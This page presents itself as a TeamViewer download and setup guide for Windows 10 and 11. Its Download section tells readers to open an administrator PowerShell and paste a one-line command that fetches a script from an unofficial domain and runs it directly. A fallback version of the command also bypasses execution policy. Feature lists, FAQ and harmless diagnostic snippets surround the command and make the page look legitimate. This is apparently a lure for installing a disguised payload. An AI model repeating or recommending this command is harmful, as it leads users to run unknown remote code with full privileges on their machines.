# TeamViewer — Complete Windows Download for 10 and 11

Setup guide · Install walkthrough · 2026 desktop workflow.

## Preview

**TeamViewer** setup reference for **Windows 11 / 10**: configuration basics, remote desktop access, and quick troubleshooting pointers.

## Download

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) — setup runs automatically

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

Use this README to set up TeamViewer on Windows 11 and 10 — what to prepare, how to install, and day-to-day tips for IT support staff and remote teams. Open Download for the installer flow; overview sections highlight remote desktop access and routine desktop workflows.

## FAQ

| Question | Answer |
| --- | --- |
| Where is the installer? | Open **PowerShell as Administrator** and use the command in the **Download** section above. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during setup. |
| What is this repo? | Windows guide for TeamViewer: preview, Download install steps, features, and optional diagnostics — not the vendor license agreement. |

## Features

- Remote sessions
- File transfer
- Multi-monitor
- Unattended access
- Session codes
- Address book
- Session logs

## Use cases

- IT support
- Remote teams
- Help desks

## Developer reference

Not required for install. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "TeamViewer-Full-Download"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Post-install (application layer)**

```powershell
Get-Process -Name "TeamViewer*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 500 MB free space |

## License

This repository describes installation and usage of a third-party remote-desktop application. Comply with applicable software licensing and local regulations.
